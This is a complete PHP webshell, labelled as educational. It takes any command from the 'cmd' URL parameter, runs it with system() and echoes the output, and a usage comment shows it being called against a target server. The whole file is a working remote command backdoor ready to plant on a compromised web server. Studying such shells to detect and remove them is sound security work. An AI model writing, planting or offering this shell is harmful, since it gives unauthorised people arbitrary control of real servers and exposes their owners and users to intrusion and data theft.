<?php
// Simple PHP webshell for educational purposes
// Usage: http://target/webshell.php?cmd=whoami

if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
} else {
    echo "Webshell ready. Use ?cmd=command to execute.";
}
?> 